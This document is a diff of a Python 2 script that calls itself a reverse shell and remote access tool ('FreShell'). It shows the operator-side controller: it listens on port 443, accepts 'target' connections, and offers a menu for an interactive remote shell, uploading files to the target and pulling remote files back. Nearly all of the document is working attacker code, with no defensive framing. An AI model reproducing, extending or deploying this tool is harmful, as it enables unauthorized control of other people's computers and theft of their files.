@@ -2,7 +2,27 @@ import os
 import socket
 import subprocess
 import sys
+import time
 
+global i
+i=0
+
+def banner():
+    print "\n[+] Freshnut's FreShell, a simple Python Reverse Shell. [+]\n"
+    print """
+==============================================================================
+@@@@@@@@  @@@@@@@   @@@@@@@@   @@@@@@   @@@  @@@  @@@@@@@@  @@@       @@@       
+@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@   @@@  @@@  @@@@@@@@  @@@       @@@       
+@@!       @@!  @@@  @@!       !@@       @@!  @@@  @@!       @@!       @@!       
+!@!       !@!  @!@  !@!       !@!       !@!  @!@  !@!       !@!       !@!       
+@!!!:!    @!@!!@!   @!!!:!    !!@@!!    @!@!@!@!  @!!!:!    @!!       @!!       
+!!!!!:    !!@!@!    !!!!!:     !!@!!!   !!!@!!!!  !!!!!:    !!!       !!!       
+!!:       !!: :!!   !!:            !:!  !!:  !!!  !!:       !!:       !!:       
+:!:       :!:  !:!  :!:           !:!   :!:  !:!  :!:        :!:       :!:      
+ ::       ::   :::   :: ::::  :::: ::   ::   :::   :: ::::   :: ::::   :: ::::  
+ :         :   : :  : :: ::   :: : :     :   : :  : :: ::   : :: : :  : :: : :  
+==============================================================================
+"""
 
 host = ''
 port = 443
@@ -22,89 +42,22 @@ def bind():
         print "Cannot bind Socket & Port."
         exit()
 
-def accept():
+def listen():
     try:
-        s.listen(1)
+        s.listen(3)
     except socket.error:
         print "wtf, can't listen?! What did you DO!?"
         exit()
+
+def accept():
     global conn, addr
     conn, addr = s.accept()
-
-def banner():
-    print "\n[+] Freshnut's FreShell, a simple Python RAT. [+]\n"
-    print """
-==============================================================================
-@@@@@@@@  @@@@@@@   @@@@@@@@   @@@@@@   @@@  @@@  @@@@@@@@  @@@       @@@       
-@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@   @@@  @@@  @@@@@@@@  @@@       @@@       
-@@!       @@!  @@@  @@!       !@@       @@!  @@@  @@!       @@!       @@!       
-!@!       !@!  @!@  !@!       !@!       !@!  @!@  !@!       !@!       !@!       
-@!!!:!    @!@!!@!   @!!!:!    !!@@!!    @!@!@!@!  @!!!:!    @!!       @!!       
-!!!!!:    !!@!@!    !!!!!:     !!@!!!   !!!@!!!!  !!!!!:    !!!       !!!       
-!!:       !!: :!!   !!:            !:!  !!:  !!!  !!:       !!:       !!:       
-:!:       :!:  !:!  :!:           !:!   :!:  !:!  :!:        :!:       :!:      
- ::       ::   :::   :: ::::  :::: ::   ::   :::   :: ::::   :: ::::   :: ::::  
- :         :   : :  : :: ::   :: : :     :   : :  : :: ::   : :: : :  : :: : :  
-==============================================================================
-
-Awaiting for connection.."""
-
-def menu():
-    if addr:
-            os.system("clear")
-            sys.stdout.write("[+] Connected: ")
-            print addr
-    options = """
-Options:
-
-  1               Interactive Shell
-                  Type "quit" to return to menu from Interactive Shell
-  2               Upload File to CWD
-  3               Download File
-  4               Target IP & Port
-  quit            Quit
-  help            Display Options
-  disconnect      Disconnect from Client"""
-    print options
-    while True:
-        choice = raw_input("> ")
-        if choice == "1":
-            print "[+] Entering Shell\n"
-            #conn.send("[+] Interactive Mode Enabled")
-            command()
-        elif choice == "2":
-            print "Upload File to: ", addr
-            conn.send("rcv_file")
-            snd_file()
-        elif choice == "3":
-            print "Download File from: ", addr
-            conn.send("snd_file")
-            rcv_file()
-        elif choice == "4":
-            sys.stdout.write("Target: ")
-            print addr
-        elif choice == "quit":
-            print "[+] Exit"
-            conn.close()
-            s.close()
-            exit()
-        elif choice == "help":
-            os.system("clear")
-            print options
-        elif choice == "disconnect":
-            print "[+] Disconnecting Target"
-            conn.send("disconnect")
-            conn.close()
-        else:
-            print "[-] wtf.. you broke it."
-            exit()
+    print "[+] New Target Connection: ", addr
 
 # Interactive Shell
 def command():
-    # cwd = conn.recv(1024) # Get CWD on intial connection
     while True:
-        # sys.stdout.write(cwd)
-        cmd = raw_input("#> ")
+        cmd = raw_input("freshell#> ")
         split = cmd.split(" ")
         cd = split[0]
         path = split[-1]
@@ -113,14 +66,13 @@ def command():
         except:
             print "[-] Cannot send user input."
         if cmd == "quit":
-            menu()
+            main()
         elif cd == "cd":
             continue
         else:
             data = conn.recv(4096)
             sys.stdout.write(data)
             sys.stdout.flush()
-
 
 # Upload File
 def snd_file():
@@ -138,8 +90,7 @@ def snd_file():
     snd_f.close()
     print "[+] File Sent"
 
-
-# Download File
+# Recover File
 def rcv_file():
     loc_f = raw_input("Remote file path: ")
     split = loc_f.split("/")
@@ -159,11 +110,72 @@ def rcv_file():
 
 
 def main():
-    banner()
-    connect()
-    bind()
-    accept()
-    menu()
-    s.close()
 
+    if addr:
+            os.system("clear")
+            sys.stdout.write("[+] Connected: ")
+            print addr
+    options = """
+Options:
+
+  1               Interactive Shell
+                  - Type "quit" to return to menu from Interactive Shell
+  2               Upload File
+  3               Download File
+  4               Target IP & Port
+  q               Quit
+  help            Display Options
+  dc              Disconnect from Client"""
+    print options
+    while True:
+        choice = raw_input("> ")
+        if choice == "1":
+            print "[+] Entering Shell\n"
+            command()
+        elif choice == "2":
+            print "Upload File to: ", addr
+            conn.send("snd_cli")
+            snd_file()
+        elif choice == "3":
+            print "Download File from: ", addr
+            conn.send("rcv_cli")
+            rcv_file()
+        elif choice == "4":
+            try:
+                conn.send("test")
+                sys.stdout.write("[+] Connected: ")
+                print addr
+            except:
+                sys.stdout.write("[-] Disconnected: ")
+                print addr
+        elif choice == "q":
+            conn.send("D1SC0NN3CT")
+            print "[+] Disconnecting Target & Exiting.."
+            time.sleep(1)
+            conn.close()
+            s.close()
+            print "[+] Exit"
+            exit()
+        elif choice == "help":
+            os.system("clear")
+            print options
+        elif choice == "dc":
+            print "[+] Disconnect from Target but don't Exit"
+            conn.send("disconnect")
+            time.sleep(1)
+            conn.close()
+        else:
+            print "[-] wtf.. you broke it. Input Error"
+            time.sleep(1) 
+            main()
+
+banner()
+connect()
+bind()
+listen()
+accept()
 main()
+
+# In case function don't exit & close socket properly.
+s.close()
+exit()
